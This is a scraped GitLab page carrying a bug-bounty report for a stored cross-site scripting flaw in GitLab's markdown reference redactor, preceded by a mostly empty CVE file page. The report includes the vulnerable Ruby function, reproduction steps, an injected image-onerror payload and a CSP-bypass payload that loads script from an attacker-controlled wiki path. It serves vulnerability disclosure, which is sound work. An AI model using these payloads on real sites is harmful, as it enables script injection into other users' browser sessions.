=== Content from gitlab.com_6bb786a9_20250119_111842.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2020](/gitlab-org/cves/-/tree/master/2020)
* [**CVE-2020-13338.json**](/gitlab-org/cves/-/blob/master/2020/CVE-2020-13338.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2020/CVE-2020-13338.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2020/CVE-2020-13338.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  Oct 02, 2020

  [582d0bb8](/gitlab-org/cves/-/commit/582d0bb8612569f58d05df22f8ecd771311bbde0)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/582d0bb8612569f58d05df22f8ecd771311bbde0)
  繚
  582d0bb8

  [ GitLab Bot ](/gitlab-bot) authored Oct 02, 2020

  582d0bb8

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/582d0bb8612569f58d05df22f8ecd771311bbde0)
  [ GitLab Bot ](/gitlab-bot) authored Oct 02, 2020

Loading



=== Content from gitlab.com_9b922055_20250119_111843.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored XSS in markdown when redacting references

**[HackerOne report #836649](https://hackerone.com/reports/836649)** by `vakzz` on 2020-04-01, assigned to [@ankelly](/ankelly "Andrew Kelly"):

### Summary

It's possible to inject arbitrary html into the markdown by abusing the ReferenceRedactorFilter. This is due to the `data-original` attribute allowing html encoded data to be stored, which is then extracted and used as the link content. If the original data already is html encoded then it will be unencoded after it is redacted:

```
    def redacted_node_content(node)
      original_content = node.attr('data-original')
      link_reference = node.attr('data-link-reference')

      # Build the raw <a> tag just with a link as href and content if
      # it's originally a link pattern. We shouldn't return a plain text href.
      original_link =
        if link_reference == 'true'
          href = node.attr('href')
          content = original_content

          %(<a href="#{href}">#{content}</a>)
        end

      # The reference should be replaced by the original link's content,
      # which is not always the same as the rendered one.
      original_link || original_content || node.inner_html
    end
```

### Steps to reproduce

1. create a private project with one account
2. create an issue in the private project
3. sign into another account that does not have permission to read the above project
4. comment on an issue linking to the private issue using the following:

   ```
   link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>
   ```
5. The rendered markdown contains the injected html:

   ```
   <div class="md"><p data-sourcepos="1:1-1:124" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">xss <img onerror="alert(1)" src="x"></a></p></div>
   ```

The above is blocked by the csp, but that can be bypassed similar to <https://hackerone.com/reports/662287#activity-6026826> (requires clicking anywhere on the page, but the link is full screen):

```
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">csp
&lt;a
  data-remote=&quot;true&quot;
  data-method=&quot;get&quot;
  data-type=&quot;script&quot;
  href=/wbowling/wiki/raw/master/test.js
  class='atwho-view select2-drop-mask pika-select'
&gt;
  &lt;img height=10000 width=10000&gt;
&lt;/a&gt;
</a>
```

which generates the following html:

```
<div class="md issue-realtime-trigger-pulse"><p data-sourcepos="1:1-11:4" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">csp
</a><a data-remote="true" data-method="get" data-type="script" href="/wbowling/wiki/raw/master/test.js" class="atwho-view select2-drop-mask pika-select">
<img height="10000" width="10000">
</a>
</p></div>
```

### Impact

Anywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss

### Examples

* example payload: <https://gitlab.com/vakzz-h1/stored-xss/-/issues/1>
* with csp bypass (requires clicking anywhere on the page): <https://gitlab.com/vakzz-h1/stored-xss/-/issues/2>

### What is the current *bug* behavior?

The `data-original` attribute can be abused to inject arbitrary html when a reference is redacted.

### What is the expected *correct* behavior?

The `data-original` should be double encoded or filtered before being reused.

### Relevant logs and/or screenshots

[![Screen_Shot_2020-04-02_at_9.44.33_am.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/96de18549b2a618d795fbeaa0a50cc04f9f5baf9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31666335636533342d383735342d343964392d613637372d6133633333306430653138312f53637265656e5f53686f745f323032302d30342d30325f61745f392e34342e33335f616d2e706e67)

### Output of checks

Happens on gitlab.com

#### Results of GitLab environment info

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.1
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.9.2-ee
Revision:	0ad76f4d374
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	12.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Anywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen\_Shot\_2020-04-02\_at\_9.44.33\_am.png](https://h1.sec.gitlab.net/a/1fc5ce34-8754-49d9-a677-a3c330d0e181/Screen_Shot_2020-04-02_at_9.44.33_am.png)

Edited Apr 07, 2020 by [Brett Walker](/digitalmoksha)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


